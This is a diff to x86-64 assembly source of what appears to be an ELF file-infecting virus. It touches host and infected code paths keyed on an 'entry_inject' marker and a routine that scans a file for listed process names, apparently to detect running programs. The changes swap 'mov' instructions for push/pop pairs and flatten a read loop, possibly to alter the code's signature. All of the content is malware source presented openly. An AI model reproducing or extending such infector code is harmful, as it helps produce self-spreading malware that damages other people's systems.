@@ -94,7 +94,8 @@ _end:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne .infected
 
-	mov rax, 60 ; exit
+	push 60
+	pop rax ; exit
 	xor rdi, rdi; = 0
 	syscall
 
@@ -487,39 +488,38 @@ _check_file_process:; (string rdi)
 	cmp r9, 0x0
 	jl .return; jump lower
 
-	.loop_read:
-		mov rdi, r9
-		mov rsi, rsp
-		push 0x800
-		pop rdx
-		syscall
+	mov rdi, r9
+	mov rsi, rsp
+	push 0x800
+	pop rdx
+	syscall
 
-		cmp rax, 0x0
-		je .close
+	cmp rax, 0x0
+	je .close
 
+		push rax
+		pop rsi
+		lea rdi, [rel process]
+		xor rcx, rcx; = 0
+		.loop_array_string:
+			add rdi, rcx
+			; check if it is in the file
+			call _ft_strlen
+			cmp rsi, rax
+			jl .close
 			push rax
-			pop rsi
-			lea rdi, [rel process]
-			xor rcx, rcx; = 0
-			.loop_array_string:
-				add rdi, rcx
-				; check if it is in the file
-				call _ft_strlen
-				cmp rsi, rax
-				jl .close
-				push rax
-				pop rcx
-				push rdi
-				pop rdx
-				mov rdi, rsp; buffer
-				call _ft_memmem
-				cmp rax, 0x0
-				jne .close
-				push rdx
-				pop rdi
-			inc rcx
-			cmp byte[rdi + rcx], 0x0
-			jnz .loop_array_string
+			pop rcx
+			push rdi
+			pop rdx
+			mov rdi, rsp; buffer
+			call _ft_memmem
+			cmp rax, 0x0
+			jne .close
+			push rdx
+			pop rdi
+		inc rcx
+		cmp byte[rdi + rcx], 0x0
+		jnz .loop_array_string
 
 	xor rax, rax
 	.close:
@@ -555,7 +555,8 @@ _ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or m
 	mov byte[rdi], '/'
 	inc rdi
 	call _ft_strcpy
-	mov rdi, rdx
+	push rdx
+	pop rdi
 	mov rax, rdi
 
 	pop rdx
